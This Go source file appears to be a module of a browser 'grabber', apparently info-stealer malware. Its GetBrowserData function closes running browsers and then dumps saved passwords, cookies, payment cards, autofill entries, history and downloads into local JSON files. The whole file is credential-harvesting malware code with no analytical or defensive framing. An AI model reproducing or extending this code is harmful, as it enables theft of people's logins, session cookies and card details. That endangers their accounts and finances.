package browsers

import (
	"os"

	"kdot/grabber/browsers/autofill"
	"kdot/grabber/browsers/cards"
	"kdot/grabber/browsers/cookies"
	"kdot/grabber/browsers/downloads"
	"kdot/grabber/browsers/history"
	"kdot/grabber/browsers/pass"
	"kdot/grabber/browsers/util"
)

func GetBrowserPasswords() {
	//fmt.Println(pass.GetPasswords())
	os.WriteFile("passwords.json", []byte(pass.Get()), 0644)
}

func GetBrowserCookies() {
	os.WriteFile("cookies.json", []byte(cookies.Get()), 0644)
}

func GetBrowserHistory() {
	//fmt.Println(history.GetHistory())
	os.WriteFile("history.json", []byte(history.Get()), 0644)
}

func GetBrowserAutofill() {
	os.WriteFile("autofill.json", []byte(autofill.Get()), 0644)
}

func GetBrowserCards() {
	os.WriteFile("cards.json", []byte(cards.Get()), 0644)
}

func GetBrowserDownloads() {
	os.WriteFile("downloads.json", []byte(downloads.Get()), 0644)
}

func GetBrowserData() {
	util.CloseBrowsers()
	GetBrowserPasswords()
	GetBrowserHistory()
	GetBrowserCookies()
	GetBrowserDownloads()
	GetBrowserCards()
	GetBrowserAutofill()
}
